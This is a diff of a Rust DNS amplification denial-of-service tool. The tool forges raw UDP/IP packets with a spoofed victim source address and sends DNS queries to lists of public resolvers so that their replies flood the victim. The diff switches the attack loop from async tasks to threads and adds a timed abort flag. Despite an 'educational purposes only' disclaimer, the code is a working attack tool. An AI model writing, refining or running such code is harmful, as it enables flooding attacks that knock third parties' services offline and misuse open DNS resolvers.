@@ -4,21 +4,27 @@
 // Version: 0.1.0
 // Disclaimer: This script is for educational purposes only. I am not responsible for any damage caused by this script.
 
-use clap::{arg, command, Parser};
-use pnet::packet::ipv4::MutableIpv4Packet;
-use pnet::packet::udp::{MutableUdpPacket, self};
-use pnet::packet::Packet;
-use reqwest;
+
 use std::fs::File;
 use std::io::{self, BufRead, BufReader, Error, ErrorKind};
+use std::sync::Arc;
+use std::sync::atomic::{AtomicBool, Ordering};
+use std::{mem, thread};
+use std::mem::size_of;
 use std::net::Ipv4Addr;
 use std::str::FromStr;
 use std::time::Duration;
-use tokio::{self};
+
+use clap::{arg, command, Parser};
+
+use pnet::packet::ipv4::MutableIpv4Packet;
+use pnet::packet::udp::MutableUdpPacket;
+use pnet::packet::Packet;
+
+use reqwest;
+use tokio;
 
 use libc::{sendto, sockaddr, sockaddr_in, AF_INET, IPPROTO_RAW, SOCK_RAW};
-use std::mem;
-use std::mem::size_of;
 
 fn colorize(text: &str, color: &str) -> String {
     let color = match color {
@@ -59,7 +65,7 @@ fn read_public_dns_servers(file: &str) -> io::Result<Vec<String>> {
     Ok(dns_servers)
 }
 
-async fn send_dns_query(
+fn send_dns_query(
     dst_ip: Ipv4Addr,
     domain: &str,
     source_ip: Ipv4Addr,
@@ -69,12 +75,10 @@ async fn send_dns_query(
     let dns_query_payload = build_dns_query(domain, record_type);
     let udp_payload = build_udp_packet(source_port, 53, source_ip, dst_ip, &dns_query_payload);
     let ip_payload = build_ip_packet(source_ip, dst_ip, &udp_payload);
-    
-    println!("ip_payload: {:?}", ip_payload);
 
     match send_raw_packet(dst_ip, &ip_payload) {
         Ok(_) => println!(
-            "{} {} {} {} {}",
+            "{} {} {} {} {}...",
             colorize("Sent", "green"),
             colorize("DNS", "yellow"),
             colorize("query", "yellow"),
@@ -201,7 +205,7 @@ fn send_raw_packet(dst_ip: Ipv4Addr, packet: &[u8]) -> Result<(), Error> {
     };
 
     if send_bytes != packet.len() as isize {
-        let err = Error::new(ErrorKind::Other, "failed to send packet");
+        let err = Error::new(ErrorKind::Other, "Failed to send packet");
         unsafe { libc::close(sock) };
         return Err(err);
     }
@@ -214,13 +218,17 @@ fn send_raw_packet(dst_ip: Ipv4Addr, packet: &[u8]) -> Result<(), Error> {
     Ok(())
 }
 
-async fn amplify(
+fn amplify(
     dns_servers: &Vec<String>,
     domain: &str,
     source_ip: &str,
     source_port: u16,
     record_type: &str,
+    aborted: Arc<AtomicBool>,
 ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
+    if aborted.load(Ordering::Relaxed) {
+        return Ok(());
+    }
     let source_ip = match Ipv4Addr::from_str(source_ip) {
         Ok(ip) => ip,
         Err(_) => return Err("Invalid source IP address".into()),
@@ -234,7 +242,7 @@ async fn amplify(
                     continue;
                 }
             };
-            send_dns_query(dns_server, domain, source_ip, source_port, record_type).await?;
+            let _ = send_dns_query(dns_server, domain, source_ip, source_port, record_type);
         }
     }
 }
@@ -303,6 +311,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         dns_servers = read_public_dns_servers(args.server_list.as_ref().unwrap()).unwrap();
     }
 
+    let aborted = Arc::new(AtomicBool::new(false));
     let mut handles = vec![];
 
     println!(
@@ -316,37 +325,25 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         let source_ip = source_ip.to_string();
         let domain = domain.clone();
         let record_type = record_type.clone();
+        let aborted = aborted.clone();
 
-        let handle = tokio::spawn(async move {
-            amplify(&dns_servers, &domain, &source_ip, source_port, &record_type).await
+        let handle = thread::spawn(move || {
+            let _ = amplify(&dns_servers, &domain, &source_ip, source_port, &record_type, aborted);
         });
 
         handles.push(handle);
     }
 
     if let Some(time) = time {
-        tokio::time::sleep(Duration::from_secs(time)).await;
-        for handle in handles {
-            handle.abort();
-        }
-        println!(
-            "\nAttack on {} for {} seconds finished...",
-            colorize(source_ip, "green"),
-            colorize(&time.to_string(), "red")
-        );
+        thread::sleep(Duration::from_secs(time));
+        aborted.store(true, Ordering::Relaxed);
     } else {
         for handle in handles {
-            match handle.await {
-                Ok(_result) => {
-                    println!("Attack on {} finished...", colorize(&source_ip, "red"));
-                    return Ok(());
-                }
-                Err(error) => {
-                    eprintln!("Error occurred: {}", error);
-                }
-            }
+            handle.join().unwrap();
         }
     }
+
+    println!("Attack on {} finished...", source_ip);
 
     Ok(())
 }
